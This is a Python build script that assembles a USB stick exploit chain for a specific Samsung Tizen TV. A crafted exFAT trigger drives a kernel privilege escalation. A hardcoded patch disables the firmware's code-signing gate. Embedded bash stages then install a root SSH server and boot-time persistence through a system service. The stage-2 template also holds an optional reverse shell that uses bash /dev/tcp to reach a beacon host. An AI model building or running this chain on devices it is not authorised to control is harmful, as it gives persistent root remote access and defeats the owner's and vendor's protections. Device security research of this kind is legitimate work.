#!/usr/bin/env python3
"""Assemble the Samsung TV USB stick (T-MSMDEUC-1500.9 / GQ65Q70RGTXZG).

Layout (MBR, 1 MiB-aligned):

  p1  exFAT   trigger filesystem. Auto-mounted by storaged on insert; the
              crafted image that drives the filesystem-parser kernel LPE
              (exfat num_ext / ntfs parse_mft / ext4 eh_depth - whichever
              lane lands). If --trigger is omitted a *valid, unweaponised*
              exFAT volume is created as a placeholder.
  p2  vfat    payload partition (vfat = built-in fs, always mounted by
              storaged; mount is NOEXEC/NOSUID/NODEV by module_block.so, so
              the payload is data only - it is staged to /opt before use):
                /dropbearmulti              static ARM EABI5 soft-float musl
                /dropbear_host_ed25519      host keys (dropbearkey-generated)
                /dropbear_host_rsa
                /authorized_keys            user's pubkeys
                /uep.patch                  8-byte UEP neutraliser (write-only use)
                /parseinfo.sh               stage-2 persistence anchor payload

Stage flow once the LPE lands (see findings/ + notes/POSTEX-PLAN.md):

  trigger  -> kernel LPE -> exec of stage1 (bash script read from p1 by the
              exploit payload; UEP gates exec of *binaries*, not bash args)
  kernel   -> copies a position-independent stage to a fixed core-text cave,
              flushes it, patches UEP, and starts signed /bin/bash asynchronously.
  stage1   -> bash waits for p2, stages it to /opt (mmcblk0p21, RW and
              exec-capable), installs authorized_keys/host keys, writes
              /opt/etc/parseinfo.sh, starts dropbear, optionally beacons home.
  stage2   -> /opt/etc/parseinfo.sh is a persistent staging anchor executed as
              root by enabled AT-HUB.service. UEP itself is re-patched by p1 on
              each boot while the stick remains present (CONFIG_DEVMEM=n).

Usage (inside `nix develop`):
  python3 tools/mk_usb_stick.py --exploit-profile tv \
      --authorized-keys ~/.ssh/id_ed25519.pub \
      --out out/tv-usb-dropbear.img --force

Outputs out/tv-usb-stick.img + out/tv-usb-stick.img.sha256 and prints the
`dd` instructions for a physical stick.
"""
import argparse
import hashlib
import math
import os
import shutil
import subprocess
import sys
import tempfile

LABEL_TRIG = "SMTTRIG"
LABEL_PAY = "SMTPAY"
# UEP gate in the shipped uImage (see notes/POSTEX-PLAN.md):
#   0xc01d49b8: e3a00002   mov r0, #2    ; SF_STATUS_UEP_SIGNATURE_CORRECT
#   0xc01d49bc: e12fff1e   bx  lr
# Little-endian byte order in the patch file:
UEP_PATCH = bytes.fromhex("0200a0e31eff2fe1")
UEP_PHYS = 0x801D49B8


def run(cmd, **kw):
    print(f"  $ {' '.join(str(c) for c in cmd)}")
    return subprocess.run([str(c) for c in cmd], check=True, **kw).returncode


def cap(cmd):
    """Run, capture stdout, return text (raises on failure)."""
    return subprocess.run(cmd, check=True, text=True, capture_output=True).stdout


def ensure_host_keys(payload_dir, qemu_arm, dropbear):
    """Generate dropbear host keys with the shipped-in-repo dropbearkey.

    Keys must be in a format dropbear 2022.83 reads; the safest producer is
    dropbearkey itself, run under qemu-arm. Fresh keys per stick.
    """
    store = os.path.join(payload_dir, "store")
    os.makedirs(store, exist_ok=True)
    for t, args in (("ed25519", []), ("rsa", ["-s", "3072"])):
        k = os.path.join(store, f"dropbear_host_{t}")
        if os.path.exists(k):
            continue
        print(f"[+] generating host key {t} via dropbearkey (qemu-arm)")
        run([qemu_arm, dropbear, "dropbearkey", "-t", t, "-f", k, *args])
    return store


def write_uep_patch(payload_dir):
    """8-byte kernel-text patch, applied at every boot by parseinfo.sh."""
    p = os.path.join(payload_dir, "uep.patch")
    with open(p, "wb") as f:
        f.write(UEP_PATCH)
    return p


def stage2_script(dropbear_port, beacon):
    b = f"BEACON={beacon}" if beacon else "BEACON="
    return f"""#!/bin/bash
# parseinfo.sh - stage-2 persistence anchor payload
# Installed to /opt/etc/parseinfo.sh. AT-HUB.service (enabled, root) runs
# ExecStart=/opt/etc/parseinfo.sh at every boot; the file ships absent from
# this firmware, so we are the first and only real definition.
#
# What this script CAN do without the kernel exploit (correct as of the
# DEVMEM finding, see notes/POSTEX-PLAN.md):
#   - stage /opt payload, keys, and authorized_keys (plain writes, UEP-free)
#   - start dropbear the moment UEP is down (e.g. this boot's LPE fire from
#     the stick's trigger partition)
# What it CANNOT do:
#   - patch the kernel itself: /dev/mem does not exist (CONFIG_DEVMEM=n,
#     Muse.M-Tizen_release_defconfig:1547) and insmod is SFD-dispatched.
#     UEP comes down only via the LPE primitive itself.

DROPBEAR_BIN=/opt/bin/dropbearmulti
DROPBEAR_DIR=/opt/etc/dropbear
DROPBEAR_PORT={dropbear_port}
{b}

# ---- 1. dropbear when UEP is down (keys only, root only) ----
# This build reads root's allowlist directly from
# /opt/etc/dropbear/authorized_keys; /root remains untouched/read-only.
chmod 600 $DROPBEAR_DIR/authorized_keys 2>/dev/null

# Exec probe: while the gate is up this exits silently (UEP denies, wait for
# the next boot-with-stick where the LPE runs); once the gate is patched the
# same line starts the server.
if $DROPBEAR_BIN dropbear -V >/dev/null 2>&1; then
    pgrep -f "dropbearmulti dropbear" >/dev/null 2>&1 \
        || $DROPBEAR_BIN dropbear \
            -r $DROPBEAR_DIR/dropbear_host_ed25519 \
            -r $DROPBEAR_DIR/dropbear_host_rsa \
            -p 0.0.0.0:$DROPBEAR_PORT -s -g
fi

# ---- 3. optional beacon (reverse shell via signed bash, UEP-immune) ----
if [ -n "$BEACON" ]; then
    BH=${{BEACON%%:*}}
    BP=${{BEACON##*:}}
    /bin/bash -c "exec 3<>/dev/tcp/$BH/$BP; \\
        /bin/sh <&3 >&3 2>&3" &
fi
"""


def stage1_script(research_kmem=False):
    research = r'''if [ -r "$P2/research_kmem.ko" ] && [ ! -e /dev/kmem ]; then
    insmod "$P2/research_kmem.ko" enable=1 >>$OPT/etc/dropbear/install.log 2>&1 || true
fi
[ ! -e /dev/kmem ] || chmod 600 /dev/kmem
''' if research_kmem else ""
    template = r'''#!/bin/bash
# Idempotent native stage: persistent data in /opt, runtime units in /run.
export PATH=/bin:/sbin:/usr/bin:/usr/sbin
P2="${P2:-${0%/*}}"
OPT=/opt
CHANGED=0
MARKER=/tmp/.samsung-usb-rooted

log() { echo "$(date '+%F %T') $*" >> $OPT/etc/dropbear/install.log; }
hash_file() { /usr/bin/sha256sum "$1" 2>/dev/null | while read h rest; do echo "$h"; done; }
copy_changed() {
    src=$1 dst=$2 mode=$3
    if [ ! -f "$dst" ] || [ "$(hash_file "$src")" != "$(hash_file "$dst")" ]; then
        /usr/bin/install -m "$mode" "$src" "$dst.new" || return 1
        /usr/bin/mv -f "$dst.new" "$dst" || return 1
        CHANGED=1
    fi
}

[ -r "$P2/dropbearmulti" ] || exit 1
# Atomic boot guard: several media workers can race through the vulnerable
# directory before p1 is detached. Exactly one stage proceeds.
mkdir "$MARKER" 2>/dev/null || exit 0
# Detach the trigger before doing slower hashing/service work. The filesystem
# and p2 remain present; a failed install retries after the next reboot.
umount -l /opt/media/USBDriveA1 2>/dev/null || true

mkdir -p $OPT/bin $OPT/etc/dropbear /run/systemd/system || exit 1
chmod 700 $OPT/etc/dropbear
log "stage acquired boot guard; p1 detached"

copy_changed "$P2/dropbearmulti" $OPT/bin/dropbearmulti 755 || exit 1
copy_changed "$P2/authorized_keys" $OPT/etc/dropbear/authorized_keys 600 || exit 1
# Preserve server identity after first install; only seed absent host keys.
[ -s $OPT/etc/dropbear/dropbear_host_ed25519 ] || /usr/bin/install -m 600 "$P2/dropbear_host_ed25519" $OPT/etc/dropbear/dropbear_host_ed25519
[ -s $OPT/etc/dropbear/dropbear_host_rsa ] || /usr/bin/install -m 600 "$P2/dropbear_host_rsa" $OPT/etc/dropbear/dropbear_host_rsa
chmod 600 $OPT/etc/dropbear/authorized_keys $OPT/etc/dropbear/dropbear_host_ed25519 $OPT/etc/dropbear/dropbear_host_rsa

cat > /run/systemd/system/dropbear-root.service.new <<'UNIT'
[Unit]
Description=Dropbear root SSH from USB bootstrap
After=network.target

[Service]
Type=simple
ExecStart=/opt/bin/dropbearmulti dropbear -F -r /opt/etc/dropbear/dropbear_host_ed25519 -r /opt/etc/dropbear/dropbear_host_rsa -p 0.0.0.0:22 -s -g
Restart=always
RestartSec=2
UNIT
/usr/bin/mv -f /run/systemd/system/dropbear-root.service.new /run/systemd/system/dropbear-root.service
systemctl daemon-reload

if systemctl is-active --quiet dropbear-root.service; then
    [ "$CHANGED" = 0 ] || systemctl restart dropbear-root.service
else
    for pid in $(pgrep -f '^/opt/bin/dropbearmulti dropbear ' 2>/dev/null); do kill "$pid" 2>/dev/null || true; done
    /bin/sleep 1
    systemctl start dropbear-root.service
fi

if ! systemctl is-active --quiet dropbear-root.service; then
    log "dropbear service failed; will retry next boot"
    exit 1
fi
if ! netstat -tln 2>/dev/null | grep -q ':22 '; then
    log "dropbear has no port-22 listener; will retry next boot"
    exit 1
fi

__RESEARCH_KMEM__
log "dropbear active; changed=$CHANGED"
exit 0
'''
    return template.replace('__RESEARCH_KMEM__', research)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--out", default="out/tv-usb-stick.img")
    ap.add_argument("--trigger", help="pre-built trigger filesystem image (default: plain exFAT)")
    ap.add_argument("--trigger-mb", type=int, default=8, help="p1 size (default: 8 MiB)")
    ap.add_argument("--exploit-profile", choices=("tv", "lab-dropbear"),
                    help="build the complete cave-copy trigger automatically")
    ap.add_argument("--craft-num-ext", type=int, default=None,
                    help="build p1 with tools/mk_trigger.py instead of using --trigger: "
                         "exFAT volume with the ffsReadDir num_ext trigger (value >= 19 arms it)")
    ap.add_argument("--craft-put", action="append", default=[],
                    help="OFF:VAL32 — payload halfword overrides for the crafted p1 (sp/pc words)")
    ap.add_argument("--authorized-keys", default=os.path.expanduser("~/.ssh/id_ed25519.pub"))
    ap.add_argument("--extra-authorized-keys", action="append", default=[])
    ap.add_argument("--dropbear", default="payload/dropbearmulti")
    ap.add_argument("--payload-dir", default="payload")
    ap.add_argument("--dropbear-port", type=int, default=22)
    ap.add_argument("--beacon", help="optional targeted TCP root shell at HOST:PORT")
    ap.add_argument("--research-kmem", action="store_true",
                    help="include and load the opt-in /dev/kmem research module")
    ap.add_argument("--size-mb", type=int, default=64)
    ap.add_argument("--force", action="store_true")
    args = ap.parse_args()

    for tool in ("sfdisk", "blkid", "mkfs.vfat", "mkfs.exfat", "mcopy", "mdir"):
        if not shutil.which(tool):
            sys.exit(f"missing tool: {tool} (run inside `nix develop`)")

    out = args.out
    if os.path.exists(out) and not args.force and not os.path.isabs(out):
        sys.exit(f"{out} exists (use --force)")
    os.makedirs(os.path.dirname(out) or ".", exist_ok=True)
    path_out = os.path.abspath(out)

    payload_dir = os.path.abspath(args.payload_dir)
    dropbear_bin = os.path.abspath(args.dropbear)
    if not os.path.isfile(dropbear_bin):
        sys.exit(f"dropbearmulti not found at {dropbear_bin}; build it first (see payload/README-BUILD.md)")
    research_ko = os.path.join(payload_dir, "research_kmem.ko")
    if args.research_kmem and not os.path.isfile(research_ko):
        sys.exit(f"--research-kmem requested but {research_ko} is missing")
    qemu_arm = shutil.which("qemu-arm")
    keys = ensure_host_keys(payload_dir, qemu_arm, dropbear_bin)
    selected = sum((args.trigger is not None,
                    args.craft_num_ext is not None,
                    args.exploit_profile is not None))
    if selected > 1:
        ap.error("choose only one of --trigger, --craft-num-ext, --exploit-profile")

    trig_src = os.path.abspath(args.trigger) if args.trigger else None
    if args.exploit_profile is not None:
        here = os.path.dirname(os.path.abspath(__file__))
        td = tempfile.mkdtemp(prefix="tvstick-exploit-")
        stage_bin = os.path.join(td, "kernel-stage.bin")
        cave_blob = os.path.join(td, "cave-blob.bin")
        trig_src = os.path.join(td, "p1.img")
        stage_profile = args.exploit_profile
        cave_profile = "tv" if stage_profile == "tv" else "lab"
        stage_cmd = [sys.executable, os.path.join(here, "build_kernel_stage.py"),
                     "--profile", stage_profile, "--out", stage_bin]
        if args.beacon:
            stage_cmd += ["--beacon", args.beacon]
        run(stage_cmd)
        run([sys.executable, os.path.join(here, "build_cave_blob.py"),
             "--profile", cave_profile, "--payload", stage_bin, "--out", cave_blob])
        num_ext = math.ceil((1420 + os.path.getsize(cave_blob)) / 30) + 1
        constants = {
            "tv": {"ldm": 0xC053107C},
            "lab": {"ldm": 0xC04DD17C},
        }[cave_profile]
        trigger_cmd = [sys.executable, os.path.join(here, "mk_trigger.py"), trig_src,
                       "--size-mb", str(args.trigger_mb), "--num-ext", str(num_ext),
                       "--put", "528:c00083d8", "--put", "548:c0008428",
                       "--put", "552:c0008e00", "--put", f"556:{constants['ldm']:08x}",
                       "--inject-allow-zero", f"1420:{cave_blob}"]
        run(trigger_cmd)
        trig_mb = args.trigger_mb
        print(f"[+] exploit profile {args.exploit_profile}: num_ext={num_ext}, "
              f"kernel_stage={os.path.getsize(stage_bin)} bytes, "
              f"cave_blob={os.path.getsize(cave_blob)} bytes")
    elif args.craft_num_ext is not None:
        # one-command option: build the trigger volume with our from-scratch
        # builder (tools/mk_trigger.py), then use it as p1.
        here = os.path.dirname(os.path.abspath(__file__))
        trig_src = os.path.join(tempfile.mkdtemp(prefix="tvstick-craft-"), "p1.img")
        trig_mb = args.trigger_mb
        cmd = [sys.executable, os.path.join(here, "mk_trigger.py"), trig_src,
               "--size-mb", str(args.trigger_mb), "--num-ext", str(args.craft_num_ext)]
        for p in args.craft_put:
            cmd += ["--put", p]
        run(cmd)
    elif trig_src:
        trig_mb = math.ceil(os.path.getsize(trig_src) / 2**20)
    else:
        trig_mb = args.trigger_mb

    total_mb = args.size_mb + trig_mb + 4  # headroom: MBR + fs metadata
    print(f"[+] opening {path_out} ({total_mb} MiB: 1 MiB alignment + p1 {trig_mb} MiB exFAT + p2 {args.size_mb} MiB vfat + slack)")
    with open(path_out, "wb") as f:
        f.truncate(total_mb * 2**20)

    # segment offsets (2048-byte units; 1 MiB alignment)
    p1_off = 2048
    p1_sectors = trig_mb * 2048
    p2_off = p1_off + p1_sectors
    p2_sectors = args.size_mb * 2048

    print("[+] writing MBR partition table")
    sfdisk_script = (
        f"label: dos\nlabel-id: 0x20770519\nunit: sectors\n\n"
        f"start={p1_off}, size={p1_sectors}, type=07, bootable\n"
        f"start={p2_off}, size={p2_sectors}, type=0e\n"  # W95 FAT16 LBA
    )
    run(["sfdisk", path_out], input=sfdisk_script.encode())

    work = tempfile.mkdtemp(prefix="tvstick-")
    try:
        # ---- p1 trigger ----
        p1 = os.path.join(work, "p1.img")
        if trig_src:
            shutil.copyfile(trig_src, p1)
        else:
            # plain, VALID exFAT placeholder (no weapon): proves p1 layout and
            # lets the TV auto-mount/do file ops on it; swap with the crafted
            # lane image when the trigger bug is settled.
            with open(p1, "wb") as f:
                f.truncate(trig_mb * 2**20)
            run(["mkfs.exfat", "-n", LABEL_TRIG, p1])
        detected = subprocess.run(
            ["blkid", "-p", "-s", "TYPE", "-o", "value", p1],
            text=True, capture_output=True).stdout.strip()
        if detected != "exfat":
            sys.exit(f"p1 failed libblkid recognition (TYPE={detected!r}); refusing image")
        print("[+] p1 libblkid recognition: TYPE=exfat")
        with open(path_out, "r+b") as f, open(p1, "rb") as s:
            f.seek(p1_off * 512)
            shutil.copyfileobj(s, f, length=1024 * 1024)

        # ---- p2 payload ----
        # FAT16 on purpose: the Linux vfat driver rejects FAT32 volumes with
        # fewer than 65 525 clusters, and dosfstools happily builds such
        # images ("Invalid argument" at mount time). Payload files are small;
        # FAT16 up to 2 GB is universally mountable.
        p2 = os.path.join(work, "p2.img")
        with open(p2, "wb") as f:
            f.truncate(args.size_mb * 2**20)
        run(["mkfs.vfat", "-F16", f"-n{LABEL_PAY}", p2])
        mcopy_args = ["mcopy", "-i", p2, "-n"]
        stage = os.path.join(work, "stage2")
        os.makedirs(stage)
        with open(os.path.join(stage, "stage1.sh"), "w") as f:
            f.write(stage1_script(args.research_kmem))
        payload_files = [
            (dropbear_bin, "dropbearmulti"),
            (os.path.join(keys, "dropbear_host_ed25519"), "dropbear_host_ed25519"),
            (os.path.join(keys, "dropbear_host_rsa"), "dropbear_host_rsa"),
            (os.path.join(stage, "stage1.sh"), "stage1.sh"),
        ]
        if args.research_kmem:
            payload_files.append((research_ko, "research_kmem.ko"))
        for src, dst in payload_files:
            run([*mcopy_args, os.path.abspath(src), f"::{dst}"])
        # authorized_keys
        ak = os.path.join(work, "authorized_keys")
        with open(ak, "w") as f:
            with open(args.authorized_keys) as s:
                f.write(s.read())
            for extra in args.extra_authorized_keys:
                with open(extra) as s:
                    f.write("\n" + s.read())
        run([*mcopy_args, ak, "::authorized_keys"])
        run(["mdir", "-i", p2, "-/"])

        print("[+] writing payload partition")
        with open(path_out, "r+b") as f, open(p2, "rb") as s:
            f.seek(p2_off * 512)
            shutil.copyfileobj(s, f, length=1024 * 1024)
    finally:
        shutil.rmtree(work)

    print("[+] verifying partition table")
    print(cap(["sfdisk", "-l", path_out]))

    hsh = hashlib.sha256(open(path_out, "rb").read()).hexdigest()
    with open(path_out + ".sha256", "w") as f:
        f.write(f"{hsh}  {os.path.basename(path_out)}\n")
    print(f"[+] wrote {path_out} ({total_mb} MiB)")
    print(f"    sha256: {hsh}")
    dev = "$STICK"
    print(f"""
    # flash to a physical stick (replace sdX; this DESTROYS it):
    sudo dd if={path_out} of=/dev/{dev} bs=4M conv=fsync status=progress
    sudo sync

    # operator keys used:
    #   authorized_keys: {args.authorized_keys}
    #   stage-2 beacon:  {args.beacon or "(none - dropbear only)"}
    #   dropbear on TV:  0.0.0.0:{args.dropbear_port} (keys-only, root)
    # UEP gate is {UEP_PHYS:#x} (phys), patch {len(UEP_PATCH)} bytes
""")


if __name__ == "__main__":
    main()
